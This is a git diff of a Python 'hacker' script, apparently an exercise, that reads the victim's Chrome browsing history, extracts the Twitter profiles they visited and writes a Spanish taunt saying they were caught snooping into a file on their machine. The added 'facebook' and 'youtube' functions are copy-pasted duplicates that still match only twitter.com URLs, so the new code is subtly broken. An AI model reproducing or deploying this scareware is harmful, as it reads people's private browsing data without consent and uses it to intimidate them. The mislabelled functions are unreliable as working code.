@@ -6,6 +6,7 @@ from random import randrange
 from pathlib import Path
 import sqlite3
 
+
 #home_path = "/home/" + os.getlogin()
 home_path = "{}".format(Path.home())
 desktop_path = home_path + "/Desktop/"
@@ -59,6 +60,29 @@ def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
             profiles_visited.append(results[0])
     hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
 
+def check_facebook_profiles_and_scare_user(hacker_file, chrome_history):
+    maxhist = 1
+    profiles_visited = []
+    url_exceptions = ["home", "notifications", "explore", "login"]
+
+    for item in chrome_history:
+        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in url_exceptions:
+            profiles_visited.append(results[0])
+    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
+
+
+def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
+    maxhist = 1
+    profiles_visited = []
+    url_exceptions = ["home", "notifications", "explore", "login"]
+
+    for item in chrome_history:
+        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in url_exceptions:
+            profiles_visited.append(results[0])
+    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
+
 def main():
     print(FILE)
 
@@ -66,6 +90,9 @@ def main():
     hacker_file = create_hacker_file()
     chrome_history = get_chrome_history()
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
+    check_facebook_profiles_and_scare_user(hacker_file, chrome_history)
+    check_youtube_profiles_and_scare_user(hacker_file, chrome_history)
+
 
 
 
